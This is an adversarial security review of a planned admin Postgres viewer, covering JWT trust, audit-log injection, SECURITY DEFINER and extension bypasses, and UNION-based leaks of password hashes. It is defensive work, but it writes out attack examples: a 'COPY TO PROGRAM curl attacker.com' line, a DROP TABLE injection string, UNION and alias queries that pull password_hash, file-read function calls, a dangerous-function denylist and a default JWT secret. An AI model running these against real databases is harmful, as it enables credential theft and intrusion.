# Critic Round 1 — 013-postgres-viewer — SECURITY

**Reviewer angle**: adversarial / defense-in-depth stress test.
**Scope**: spec.md, research.md, plan.md, data-model.md, contracts/pg-viewer-api.yaml, tasks.md, quickstart.md + cross-checks against actual `backend/app/auth.py`, `backend/app/main.py`, `backend/app/services/sql_guard.py`.
**Date**: 2026-04-20.

## Verdict: **CONDITIONAL_YES**

The 9-layer model is sound and PG role `aikm_viewer` is the correct last-line defense. But several attack surfaces are under-specified and at least two concrete critical gaps exist (hardcoded-default JWT secret reachable via admin bypass + audit-writer codepath uses the same pooled session the viewer runs in, which — depending on impl — can either leak the write path or break under concurrent use). Pre-code gaps listed below must be fixed in the spec/migration before T-010 starts. If all CRITICAL and HIGH items are addressed, this feature is safe to build.

## Resolution (appended by planner after round-1 review, 2026-04-20)

All CRITICAL and HIGH findings ADDRESSED via spec updates. No residual CRITICAL; one RISK_ACCEPTED HIGH (JWT in localStorage).

### CRITICAL (3/3 ADDRESSED)
- **C1 JWT fallback / default secret**: ADDRESSED. 012 fix in `backend/app/auth.py:19-39` already refuses to start in production with default/missing `JWT_SECRET` (on branch `012-maximo-query-tools` awaiting merge to main). 013 adds T-002.5 which (a) re-asserts the same guard when `PG_VIEWER_ENABLED=true`, (b) new `require_admin_strict` re-fetches `account_level` from DB per request (never trusts JWT `role` claim), (c) T-041 PoC #21 asserts no `account_level IS NULL` users. spec.md FR-003 rewritten; plan.md Security-Layer L1 updated.
- **C2 audit writer injection surface + append-only**: ADDRESSED. T-014 mandates SQLAlchemy `insert()` / bind-params only (no f-string), independent transaction, and the 002 migration REVOKEs UPDATE/DELETE/TRUNCATE on `pg_viewer_audit_log` from `aikm` (append-only at engine level). See data-model.md §4b, tasks.md T-014 acceptance, FR-017a.
- **C3 SECURITY DEFINER + extension + UNION bypass (most dangerous)**: ADDRESSED via **option-b view approach**. Migration 001 now: (i) REVOKEs SELECT on `users`, `sessions`, `api_keys`, `pg_viewer_audit_log` from `aikm_viewer`; (ii) creates `users_public` view with safe columns only; (iii) REVOKEs EXECUTE on all functions in public from `aikm_viewer`; (iv) fails migration if `dblink`/`postgres_fdw`/`file_fdw`/`plperlu`/etc. extensions are installed. Validator denylist also extended with function names (`pg_read_file`, `dblink`, `pg_sleep`, `lo_import`, etc.). See spec.md FR-062, data-model.md §4a, research.md D-1, tasks.md T-016/T-041 #16-20.

### HIGH (6/6 ADDRESSED — 1 partially RISK_ACCEPTED)
- **H1 CSV export row-budget**: ADDRESSED. T-015 acceptance now mandates per-cell truncation on export path (text > 1000 chars, bytea base64+200), total payload ≤ 10 MB NFR.
- **H2 rate limiting**: ADDRESSED. New FR-063 + T-014.6 rate limiter (30/min POST /sql, 60/min /rows + /export.csv via Redis token-bucket). 429 + `Retry-After` + audit `status='rate_limited'`.
- **H3 error sanitization**: ADDRESSED. FR-064 + T-014.5 `sanitize_pg_error()` util with whitelist-safe shapes and SQLSTATE→HTTP mapping. T-041 PoC #30 asserts no role name/DSN/file path/DETAIL/HINT in any error body.
- **H4 JWT in localStorage → XSS pivot**: PARTIALLY RISK_ACCEPTED. Cannot fix in this feature without whole-app auth refactor. COMPENSATING CONTROLS: strong CSP on `/admin/pg-viewer/*` (`script-src 'self'` + known hashes) — added to T-031 acceptance; documented in plan.md Risks; re-auth prompt deferred until any XSS finding is filed against the app.
- **H5 aikm_viewer network exposure**: ADDRESSED. `CONNECTION LIMIT 10` on role in migration 001; pg_hba.conf subnet restriction documented in quickstart; password rotation runbook added as quickstart §9.
- **H6 UNION / column-alias exfiltration of password_hash**: ADDRESSED via option-b view approach (see C3). Primary defense is L5 role-level REVOKE — the SQL editor cannot project `users.password_hash` because the role cannot SELECT from `users` at all. Secondary defense (column-alias redaction) kept as belt-and-suspenders. T-041 PoC #17 asserts the UNION path fails with permission denied.

### MEDIUM (10/10 ADDRESSED)
- **M1 X-Forwarded-For poisoning**: ADDRESSED. T-014 accepts XFF only from trusted proxy allowlist (frontend container IP); else `request.client.host`.
- **M2 TLS Postgres ←→ backend**: ACCEPTED (docker bridge internal). Documented as a trip-wire in research.md.
- **M3 timing-attack on /rows 403 vs 404**: ACCEPTED (admin-only surface). Log only.
- **M4 audit log visible to SQL editor**: ADDRESSED. Migration 002 `REVOKE SELECT ON pg_viewer_audit_log FROM aikm_viewer`.
- **M5 _tmp_migration_backup tables**: ACCEPTED (current spec expose everything; documented in plan).
- **M6 feature flag late-bind**: ADDRESSED. T-020 acceptance requires `get_settings()` read per request.
- **M7 notice calibration info-leak**: ACCEPTED (UX).
- **M8 information_schema visibility after SELECT revoke**: ADDRESSED via quickstart §10 operator runbook + T-044 nightly grant-audit job.
- **M9 CHECK octet_length on raw_sql**: ADDRESSED. Migration 002 adds `CHECK (raw_sql IS NULL OR octet_length(raw_sql) <= 8192)`.
- **M10 query_type vs action CHECK**: ADDRESSED. Migration 002 adds compound CHECK enforcing `(action, query_type)` pairs.

### LOW / NITS
- **N1** quickstart password regen warning: ADDRESSED (generate ONCE; §9 rotation runbook).
- **N2** redaction patterns widened: ADDRESSED (FR-061 pattern now `/password|secret|token|api_key|credential|private_key|passphrase/i`).
- **N3** schema-discovery CI: ADDRESSED (T-013 schema-scan on first import + T-044 nightly).
- **N4** audit on forbidden status: ADDRESSED (T-014 acceptance explicit).
- **N5** 408 HTTP semantics: ACCEPTED (408 per spec; documented).
- **N6** actual_row_count_estimate: DEFERRED v1.1.
- **N7** filename injection on Content-Disposition: ADDRESSED (T-015 defensive quoting).
- **N8** pg_catalog load-bearing views: documented in research.md OR-2.
- **N9** audit retention purge: ADDRESSED (T-043 + quickstart §10).
- **N10** BOM/NFC normalize: ADDRESSED (T-016 validator normalize step).


---

## CRITICAL

### C1 — JWT fallback role trust in `require_admin` (auth.py:80) is insufficient for a pg-admin surface
- **Location**: `backend/app/auth.py:80` — `"role": user.account_level or payload.get("role", "user")`.
- **Attack scenario**: If a DB row lookup returns a user with `account_level = NULL` (possible in early-seeded rows or after a partial migration), the code **falls back to the JWT-embedded `role` claim**. Anyone with a valid (non-expired) JWT can put `"role": "admin"` in their own crafted token **only** if `JWT_SECRET` is guessable. `auth.py:15` defaults `JWT_SECRET` to the literal string `"aikm-secret-key-change-in-production"` with only a warning log. If prod on 192.168.1.11 was deployed once before the env var was set, cached images and/or env files may still carry the default. Any admin of the pg-viewer can now be impersonated by a crafted token signed with the default secret.
- **Spec impact**: spec.md FR-003 states "System MUST re-check `account_level == 'admin'` on every call (no role caching beyond JWT exp)." The current `require_admin` implementation does **not** satisfy FR-003 strictly — it checks `user.get("role")` which is the OR-combined value from auth.py:80, not `account_level` specifically. A user whose DB row has `account_level = NULL` and JWT `role = "admin"` passes the check.
- **Mitigation (blocking)**:
  1. Add T-002.5: verify `JWT_SECRET` is not the default; backend MUST refuse to start if `PG_VIEWER_ENABLED=true` AND `JWT_SECRET` has the default value. Hard fail, not warn.
  2. Rewrite `require_admin` (or add a `require_admin_strict` used only by pg-viewer) to read the raw `account_level` column directly from DB and compare against the literal string `"admin"`; never fall back to JWT role claim.
  3. Add to T-040 checklist: run `docker exec aikm-postgres psql -c "SELECT count(*) FROM users WHERE account_level IS NULL"` — must be 0 before the feature ships, OR explicit "account_level IS NULL treated as non-admin" assertion is codified.

### C2 — Audit writer runs on the `aikm` (writable) session — injection surface in audit.py
- **Location**: tasks.md T-014 lines 96-102 ("Insert `pg_viewer_audit_log` rows using the **main** `aikm` session"). data-model.md does not specify the insert SQL. spec.md FR-016 says `raw_sql` up to 8000 chars is logged.
- **Attack scenario**: The attacker-controlled `raw_sql` string travels from the SQL editor through the validator (Layer 9) into an INSERT against `pg_viewer_audit_log` executed by the WRITABLE `aikm` role. If the INSERT is not parameterized (`text("INSERT INTO pg_viewer_audit_log (raw_sql) VALUES ('" + sql + "')")`), the attacker has full SQL injection into the privileged session. Even with parameterization, pg-viewer's audit write path now has a very interesting property: **the only writable code path in this feature**, driven by attacker-controlled text, writing into a table whose schema must be defended by CHECK constraints only.
- **Spec impact**: tasks.md T-014 does not mandate parameterization nor pydantic validation of `raw_sql` shape; plan.md §"Data Flow" shows the audit write happens through "main aikm session" with no further detail.
- **Mitigation (blocking)**:
  1. T-014 Acceptance must require: INSERT is built via SQLAlchemy `insert()` construct or bind-params **only**, never f-string or `str.format`. Add a unit test that inserts `'); DROP TABLE users; --` as raw_sql and verifies the table still exists after.
  2. `raw_sql` MUST be truncated server-side to `PG_VIEWER_SQL_MAX_LEN` BEFORE any DB call (spec says "truncated to 8000 chars" but doesn't say where).
  3. Add explicit guarantee: audit writes use a separate short-lived transaction; if audit fails, user response still succeeds (currently said) BUT the failure must be `logger.error` with the full error — and that error message must itself be sanitized (it may echo bits of the SQL back).
  4. Harden the `aikm` role via migration: `REVOKE DELETE, UPDATE, TRUNCATE ON pg_viewer_audit_log FROM aikm`. Only INSERT + SELECT on the audit table for the main role. This makes the audit log append-only at the engine level — currently spec allows the `aikm` role full write on its own tables.

### C3 — SQL editor Layer-9 denylist is incomplete — SECURITY DEFINER functions + pg_read_file bypass not addressed
- **Location**: spec.md FR-014, research.md "SQL Static Analysis Library" §Decision step 5, plan.md L9 entry.
- **Attack scenario**: The denylist covers DML/DDL keywords but NOT function calls. An attacker with admin access to the SQL editor can invoke any function the `aikm_viewer` role has been (inadvertently) granted EXECUTE on, or any function marked `SECURITY DEFINER` whose owner is `aikm` or a superuser:
  - `SELECT pg_read_file('/etc/passwd')` — blocked on default PG only because `pg_read_file` is superuser-only. **However**, if anyone has ever run `GRANT pg_read_server_files TO aikm_viewer` (unlikely but must be asserted), this becomes file-read.
  - `SELECT * FROM pg_stat_activity` — will leak other connections' queries including any admin's ongoing plaintext query, possibly including rows of `users.password_hash` if another path selects it. pg_stat_activity is readable by all login roles by default; in PG 14+ it's restricted to pg_read_all_stats, but `query` column visibility varies.
  - `SELECT * FROM pg_shadow` — superuser only; safe.
  - `SELECT * FROM pg_authid` — superuser only; safe.
  - `SELECT * FROM pg_user` — readable but passwords columns redacted.
  - `SELECT pg_ls_dir('.')` — superuser only; safe.
  - `SELECT lo_import('/etc/passwd')` / `lo_export(oid, '/tmp/foo')` — `lo_import` superuser only; `lo_export` superuser only since PG 11 with `pg_write_server_files`. Safe at role level, but only by accident — spec doesn't assert the check.
  - `COPY (SELECT ...) TO PROGRAM 'curl attacker.com'` — superuser only. Safe if `COPY` is denylisted (it is in FR-014). But note: `COPY` appearing in a SELECT projected as a string literal would still bypass the token walker if the walker is naive (e.g. `SELECT 'COPY' AS x` would match the denylist substring). Risk of false positives, not bypass.
  - **`SELECT dblink_exec(...)` / `dblink_connect_u(...)`**: If `dblink` extension is installed (it is not in default PG, but check the aikm DB — tasks.md does not mandate checking `pg_extension` on deploy), a connected user can perform arbitrary queries in a **different connection** and sidestep statement_timeout + the aikm_viewer role. `dblink_exec` only needs EXECUTE, default public.
  - **SECURITY DEFINER functions**: Any function in the aikm DB declared `SECURITY DEFINER` and owned by `aikm` (writable role) can be called by `aikm_viewer` via SELECT, and will execute under the aikm role's privileges — including INSERT/UPDATE/DELETE. The spec does not enumerate SECURITY DEFINER functions or mandate REVOKE EXECUTE on them from `aikm_viewer`.
- **Spec impact**: L9 denylist and `aikm_viewer` role isolation are orthogonal defenses, but the overlap between them has holes. Role-level defense (L5) doesn't help if a SECURITY DEFINER function owned by the writable `aikm` role is called.
- **Mitigation (blocking)**:
  1. Migration script must add:
     ```sql
     -- Enumerate extensions — fail migration if any of these are present
     DO $$
     DECLARE ext_name TEXT;
     BEGIN
       FOR ext_name IN SELECT extname FROM pg_extension
         WHERE extname IN ('dblink','postgres_fdw','file_fdw','plperlu','plpythonu','plsh','adminpack') LOOP
         RAISE EXCEPTION 'Dangerous extension present: %, pg_viewer migration aborted. REVOKE EXECUTE from aikm_viewer on its functions first.', ext_name;
       END LOOP;
     END$$;

     -- Revoke EXECUTE on all functions in public from aikm_viewer (introspection is via pg_catalog, not public)
     REVOKE EXECUTE ON ALL FUNCTIONS IN SCHEMA public FROM aikm_viewer;
     ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE EXECUTE ON FUNCTIONS FROM aikm_viewer;

     -- Only re-grant explicit SELECT-safe functions if needed (probably none)
     ```
  2. Extend the denylist to include function-name tokens: `dblink`, `pg_read_file`, `pg_read_server_files`, `pg_ls_dir`, `lo_import`, `lo_export`, `copy` (already), `pg_reload_conf`, `pg_terminate_backend`, `pg_cancel_backend`, `pg_sleep` (not a security issue but DoS — covered by statement_timeout, but also rejectable).
  3. Add to T-040 checklist: run a query enumerating SECURITY DEFINER functions in the DB and confirm `aikm_viewer` has no EXECUTE on any of them.
  4. Add to T-041 PoC: attempt to call `pg_read_file('/etc/passwd')`, `dblink_exec(...)` (if installed), and a known SECURITY DEFINER function — all must fail with permission denied.

---

## HIGH

### H1 — CSV export has no row-budget enforcement at the async generator layer
- **Location**: spec.md FR-040/041; tasks.md T-015 (exporter).
- **Attack scenario**: T-015 says "must NOT buffer entire CSV in memory" and caps at `PG_VIEWER_ROW_LIMIT=1000`. However if the CSV is built from a cursor-based SELECT and the row limit is enforced only at the SELECT level, a 1000-row table with 500 columns where each string column is 200KB (after the plan.md "truncate to 200 chars" rule is implemented only on the browse path, NOT the export path per current spec) = 100MB streamed. Frontend OOM + backend memory pressure during concurrent exports.
- **Mitigation**: T-015 Acceptance must require per-cell truncation (`bytea` → base64-200char, `text` → 1000char) on the export path, explicitly. Add NFR that total CSV payload ≤ 10 MB regardless of row count.

### H2 — Missing rate limiting on SQL editor endpoint
- **Location**: Entire spec; no FR covers rate limiting.
- **Attack scenario**: An admin session token (or a stolen one) can POST `/api/pg-viewer/sql` in a tight loop. Each request holds a 10s statement_timeout window + burns a connection from the 2-conn + 3-overflow pool. Five concurrent `SELECT pg_sleep(10)` calls saturate the pool; a sixth admin request gets 503 from the circuit breaker (L4). Because `SELECT pg_sleep(N)` is not denylisted and statement_timeout is 10s, an attacker can hold each connection for ~10 seconds. 5 connections × 6 holds per minute = 30 rqs/min = ~half-hour continuous DoS on the pg-viewer surface per 1000 requests.
- **Mitigation**: Add FR-NEW: rate limit `/api/pg-viewer/sql` to e.g. 30 req/min per user_id using existing `backend/app/services/cache.py` (Redis) as a token bucket. Add the same 30 req/min cap to `/rows` and `/export.csv`. Block `pg_sleep` explicitly in the denylist (low cost, defense in depth).

### H3 — Error sanitization is hand-waved; likely to leak schema internals
- **Location**: spec.md FR in US5-4, contract yaml line 198 ("sanitized — no stack trace, no connection string"), plan.md makes no explicit sanitization utility mandatory.
- **Attack scenario**: psycopg/asyncpg raise errors like `UndefinedTable: relation "users_private" does not exist` or `PermissionError: permission denied for table users_private` or `NumericValueOutOfRange: value "'; DROP …" out of range for type integer`. Returning these verbatim to the frontend leaks (a) private table names not intended to be public, (b) role name (`"permission denied for ... to role \"aikm_viewer\""`), (c) the user's injection payload echoed back (which shows the denylist was passed — useful for attackers tuning a bypass).
- **Spec impact**: Contract yaml line 198 says messages are sanitized but no dedicated util or test covers this.
- **Mitigation (blocking)**: Add T-020.5: implement `sanitize_pg_error(exc: Exception) -> str` — whitelist of allowed error shapes (`"column \"X\" does not exist"`, `"syntax error near \"...\""`) or else return a generic `"query execution failed; see audit log"`. Add unit test that no role name, no schema name other than `public`, no connection string appears in the sanitized output.

### H4 — Frontend stores JWT in `localStorage` (quickstart.md line 24) — XSS pivots to DB access
- **Location**: plan.md §"Data Flow" line 24: "JWT (localStorage)".
- **Attack scenario**: Any existing XSS in the broader app (knowledge-base markdown rendering, chat streaming output, any place that renders user-supplied HTML) can read `localStorage['access_token']` and replay against `/api/pg-viewer/sql` as the admin. The SQL editor thus inherits the XSS blast radius of the entire app. An XSS that was previously "steal chat history" is now "read every row of every table, including redacted columns if the exfiltrated token happens to belong to a code path that bypasses redaction".
- **Mitigation**: Cannot be fully fixed in this feature without a larger auth refactor (move to HttpOnly cookie). As compensating control for THIS feature:
  1. Add strong CSP header on `/admin/pg-viewer/*` pages restricting `script-src` to 'self' + known CDN hashes.
  2. Document this risk in plan.md §"Risks" and add to residual-risk section of critic report.
  3. Consider a second-factor prompt (re-auth) when entering the pg-viewer route if any XSS finding is ever filed against the app.

### H5 — No check that `aikm_viewer` login is blocked from non-backend network sources
- **Location**: data-model.md §2 migration creates role with `LOGIN` + a password. The password goes into `.env` on 192.168.1.11.
- **Attack scenario**: If `aikm-postgres` port 5432 is exposed to any network beyond the docker-internal network (check `docker-compose.yml` port mapping), anyone who obtains the `PG_VIEWER_PASSWORD` from `.env` or from a process listing or from a leaked backup can log in directly as `aikm_viewer` and issue arbitrary SELECTs including on `users.password_hash` (the role has SELECT on ALL tables in public; the redaction layer only fires in the app). Bypasses L6.
- **Mitigation**:
  1. Migration should `ALTER ROLE aikm_viewer CONNECTION LIMIT 5` to cap connections.
  2. Add to pg_hba.conf docs: `host all aikm_viewer samenet scram-sha-256` restricted to the docker-internal subnet (or `127.0.0.1/32` if the backend is on the same host). Spec must call this out — currently silent.
  3. Rotation policy for `PG_VIEWER_PASSWORD`: add to runbook, minimum 90 days.

### H6 — Denylist is stringified-token based; false negative on keyword-disguising unicode and comment tricks
- **Location**: research.md §"SQL Static Analysis Library" step 5 walks `tokens` and checks `value.upper()` against the set.
- **Attack scenario**: Known sqlparse edge cases (documented in GitHub issues #355, #451): (a) certain nested CTE + dollar-quoted string combinations cause the tokenizer to classify a DML keyword as `Literal.String.Single`, slipping the walker. (b) `SELECT E'\\x44ROP TABLE users'` — the bytes aren't keyword-classified but if later concatenated with a follow-on statement, they could be. (c) Unicode normalization: `SELECT 1 UNION SELECT password_hash FROM users` — all ASCII, passes the walker, does NOT hit the denylist (UNION isn't in it). So the attacker can still exfiltrate `users.password_hash` via UNION — the redaction layer per plan.md §"Risks" row 8 says "validator computes projected columns, redaction applied post-fetch" but a UNION projects column names from the FIRST select — so `SELECT id AS id FROM users UNION SELECT password_hash FROM users` returns a column named `id` whose values are password_hash. Redaction matches on `(table, column_name)` which here is `(???, 'id')` — does NOT match. **Password hashes leak.**
- **Spec impact**: plan.md Risk row 8 claims redaction applies to SQL editor output; this is true only if the post-fetch redaction decides based on **projected column provenance**, not the projection alias. Currently no spec mandates this.
- **Mitigation (blocking)**:
  1. Redaction on SQL editor output must be column-data-driven, not column-name-driven. Option: compute a hash-like fingerprint of every row value against a set of known-sensitive values (bcrypt prefix `$2b$`, JWT prefix `eyJ`, API-key regex). Or simpler and stricter: reject any SELECT that references `users` AND any column whose name in `information_schema` matches `/password|secret|token/i`. Parse the AST with pglast (introduce as dep for editor path only) and reject if any sensitive source-column is in the FROM/UNION tree.
  2. Alternatively: add a view `users_public` with only non-sensitive columns, and REVOKE SELECT from `aikm_viewer` on `users` (grant only on `users_public`). Bypasses the whole problem at L5.
  3. Add the fix to T-016 acceptance list. Add to T-041 PoC: `SELECT id AS id FROM users UNION SELECT password_hash FROM users LIMIT 1` — must return redacted or 403.

---

## MEDIUM

### M1 — `X-Forwarded-For` trusted without validation for audit IP (data-model.md line 39)
- **Attack scenario**: Attacker sets `X-Forwarded-For: 1.2.3.4` to poison the audit log with a false source IP. Not a security vuln in the DB itself but destroys forensic value of the audit log (post-incident attribution).
- **Mitigation**: Only accept `X-Forwarded-For` from a trusted proxy allowlist (e.g. the frontend container's IP). In `docker-compose.yml`, trust only the aikm-frontend container IP. Doc this in the spec.

### M2 — No mention of TLS between backend and Postgres
- **Attack scenario**: If the aikm-postgres container ever moves to a different host or is exposed over a less trusted network, `aikm_viewer` credentials fly in cleartext.
- **Mitigation**: Note in research.md that SSL is not required today because both containers share the docker bridge network. Add to deployment checklist: if aikm-postgres ever moves, enable SSL immediately.

### M3 — Timing-attack on `/tables/{table}/rows` vs `/tables/{bogus}/rows`
- **Attack scenario**: Non-admin sees 403 faster than table-lookup 404; admin with a wrong table name sees a 404 whose response time differs from 200. Reveals existence of tables. Low severity in admin-only context but still an info-leak.
- **Mitigation**: Not blocking. Log only.

### M4 — `pg_viewer_audit_log` visible to SQL editor (itself audited surface)
- **Attack scenario**: Admin (or attacker with admin JWT) runs `SELECT * FROM pg_viewer_audit_log` — returns the raw_sql of other admins' SQL editor queries. If another admin ran a query that pasted a password or a secret value (common forensic mistake), it leaks. More importantly, attacker can see whether their previous rejected bypass attempts were audited, and iterate.
- **Mitigation**: Exclude `pg_viewer_audit_log` from the SQL editor surface. In the migration, after granting SELECT on ALL TABLES, explicitly `REVOKE SELECT ON pg_viewer_audit_log FROM aikm_viewer`. Audit reads must go through the `/api/pg-viewer/audit` endpoint which uses the aikm role and is already gated by admin — that endpoint already exists per contract yaml line 204.

### M5 — `approx_row_count` from `pg_class.reltuples` can leak internal table names via error path
- **Attack scenario**: If admin has access to `/tables` and it queries `pg_class` joined against `pg_namespace`, reltuples can expose tables that ARE in public schema but might be intended "private" (e.g. `_tmp_migration_backup`). Spec says "expose every public table" — so this is intentional — but data-model.md does not document an explicit opt-out mechanism.
- **Mitigation**: Low priority. Decide: either expose everything (current spec) or add an ignore-prefix list `_*` for temp tables. Document the decision.

### M6 — Feature flag check at endpoint time creates late-bind race with config reload
- **Attack scenario**: If `PG_VIEWER_ENABLED=false` is flipped at runtime (via config reload endpoint), but the router has already imported the service, there's a small window where the flag is true in memory but false in env.
- **Mitigation**: Read `PG_VIEWER_ENABLED` from `get_settings()` (cached Pydantic settings) on every request, not at import time. Spec already implies this but tasks.md T-020 doesn't enforce. Add to T-020 acceptance.

### M7 — `notice` field leaks validator decisions (contract yaml line 323, 352-355)
- **Attack scenario**: `notice: "LIMIT 1000 auto-appended"` helps an attacker calibrate. Not a direct vuln but an info signal.
- **Mitigation**: Low priority. Keep the UX.

### M8 — `information_schema` introspection from the `aikm_viewer` role may expose column list of tables it cannot SELECT
- **Attack scenario**: `information_schema.columns` by default shows only columns on tables to which the role has ANY privilege. With SELECT on ALL public tables, this reveals everything in `public`. That's intentional. But if, in the future, a sensitive table is added to public and SELECT is granted and then removed, the column metadata (including names like `password_hash`) remains visible unless the role's SELECT is explicitly revoked BEFORE the data. Plan doesn't mandate this ordering.
- **Mitigation**: Runbook item: "when removing SELECT from a table for aikm_viewer, do so before the data change goes live."

### M9 — No `CHECK` constraint on `pg_viewer_audit_log.raw_sql` length
- **Location**: data-model.md §4 migration.
- **Attack scenario**: Even with app-layer truncation (FR-016), a bug or bypass could INSERT unbounded text into `raw_sql`. 8K is the documented cap but there's no DB-level enforcement.
- **Mitigation**: Add `CHECK (raw_sql IS NULL OR octet_length(raw_sql) <= 8192)` to the table DDL.

### M10 — `query_type` CHECK allows `'filter'` and `'export'` in `action` but not `query_type` — inconsistent semantics
- **Location**: data-model.md §4: `action IN ('list_tables','schema','browse','filter','export','sql_editor')` vs `query_type IN ('table_browse','schema','sql_editor')`.
- **Issue**: A `filter` action has `query_type='table_browse'` (presumably), but nothing enforces this. Audit analytics would miscount.
- **Mitigation**: Add compound CHECK: `(action IN ('list_tables','browse','filter','export') AND query_type='table_browse') OR (action='schema' AND query_type='schema') OR (action='sql_editor' AND query_type='sql_editor')`.

---

## LOW / NITS

- **N1** — quickstart.md line 36 generates a new password on every run. This would break existing backends that are already configured. Explicitly document "generate ONCE, store, reuse" — currently implicit.
- **N2** — spec.md FR-060 pattern `/password|secret|token|api_key/i` does not include `credential`, `private_key`, `passphrase`, `pin`, `cvv`, `ssn`. Spec should add.
- **N3** — The `*_secret` redaction strategy in research.md D-5 is defined only for `system_settings.value`. If new key-value config tables appear later, regression risk. Link a "schema-discovery test" (already mentioned in plan.md §Risks row 4) to an actual CI job.
- **N4** — `audit.py` (T-014) doesn't specify behavior when audit write fails DURING a SQL editor `status='forbidden'` path. Must still be recorded; a failure to audit a forbidden attempt is a security-visibility loss.
- **N5** — Contract yaml response code 408 is "Request Timeout" in HTTP semantics but is commonly used for client timeouts. Postgres `statement_timeout` is more accurately 504 "Gateway Timeout" or 500 with a specific code. Minor but inconsistent with RFC 7231. Keep as 408 but document.
- **N6** — `truncated: true` on the SQL editor response is boolean; should include `actual_row_count_estimate` if cheap (from `pg_class`) so the user knows whether their query matched 1,001 or 10M rows. Non-blocker.
- **N7** — `Content-Disposition` filename in CSV export uses `{table}_{yyyyMMdd_HHmmss}.csv` — no filename injection surface today because `table` is identifier-whitelisted, but add defensive quoting.
- **N8** — research.md §OR-2 punts on blocking `aikm_viewer` from `pg_catalog`. Decision: fine, keep it accessible — but document which `pg_catalog` views are load-bearing for the introspection service so future revokes don't break browsing.
- **N9** — No mention of backup/restore of `pg_viewer_audit_log` — audit retention is "manual purge in v1.1" but CI/dev-DB seeding may accidentally wipe it. Add WARNING in migration.
- **N10** — SqlEditor frontend uses plain `<textarea>` (T-036). Plaintext editor has no syntax highlighting, so users are more likely to copy-paste SQL with embedded whitespace anomalies (non-breaking spaces, BOM). Validator must strip BOM + normalize NFC. Add to T-016 acceptance.

---

## Checklist — what I verified and what I did not

### Verified against actual code
- `backend/app/auth.py` JWT + `require_admin` implementation — FINDING C1.
- `backend/app/main.py` CORS middleware — uses `ALLOWED_ORIGINS`, appears to be env-driven. OK.
- `backend/app/services/sql_guard.py` — existing regex-based guard used by NL2SQL; this feature correctly chooses `sqlparse` for Layer-9 rather than reusing sql_guard (good — sql_guard is weaker). No issue.
- `pg_read_file`, `pg_ls_dir`, `lo_import`, `lo_export`, `COPY TO PROGRAM` — all superuser-only by default in PG 14+. Safe at role level. Verified via PostgreSQL official docs.

### Explicitly marked "checked, no issues"
- FR-001/002/003 endpoint auth gating — correct in principle (see C1 for impl gap).
- Parameterized value binding via psycopg — spec correctly requires `Identifier` + bind params.
- Circuit breaker integration — reuses existing pattern, fine.
- Rollback plan — feature flag + role drop, clean.
- Default-privileges grant (`ALTER DEFAULT PRIVILEGES`) — correct pattern.
- Idempotent migration — DO-block with rolname check is standard.

### NOT verified (requires running PoC — scope of vuln-verifier T-041)
- Whether `dblink`, `postgres_fdw`, `file_fdw`, `adminpack` are installed on the live 192.168.1.11 aikm-postgres.
- Whether any SECURITY DEFINER functions exist in public schema.
- Whether there are users in the DB with `account_level IS NULL`.
- Whether the current JWT_SECRET on 192.168.1.11 is the default value.
- Actual sqlparse token output for specific bypass inputs (UNION, unicode, CTE+dollar-quote).

---

## Summary

- **CRITICAL count**: 3 (C1 JWT trust, C2 audit-writer injection surface, C3 SECURITY DEFINER + extension functions bypass the 9 layers).
- **HIGH count**: 6 (CSV budget, rate limiting, error sanitization, localStorage token, `aikm_viewer` network exposure, UNION/alias-based sensitive-column exfiltration).
- **MEDIUM count**: 10.
- **LOW/NITS count**: 10.

**Single most dangerous finding**: **H6 (UNION/alias-based `users.password_hash` exfiltration)** combined with **C3 (SECURITY DEFINER bypass)**. The SQL editor admits arbitrary SELECTs, the `aikm_viewer` role has SELECT on `users.password_hash`, and the redaction layer as specified matches on `(table, column_name)` — easily bypassed with `SELECT password_hash AS id FROM users` or `SELECT id FROM users UNION SELECT password_hash FROM users`. **This is an end-to-end credential exfiltration path from the very feature that was supposed to be defense-in-depth.** Fix: either column-provenance-aware redaction via pglast AST parse, or REVOKE SELECT on the sensitive columns/table and expose a `users_public` view instead.

**Top 3 priorities to fix before T-010 starts**:
1. Close C3 via migration: REVOKE EXECUTE on all functions, block dangerous extensions, enumerate SECURITY DEFINER functions.
2. Close H6 via pglast AST (or `users_public` view + role-level revoke on `users`). Row-level redaction by column-name alone is broken.
3. Close C1 by adding JWT_SECRET startup assertion and rewriting `require_admin` to read `account_level` directly (no JWT fallback).

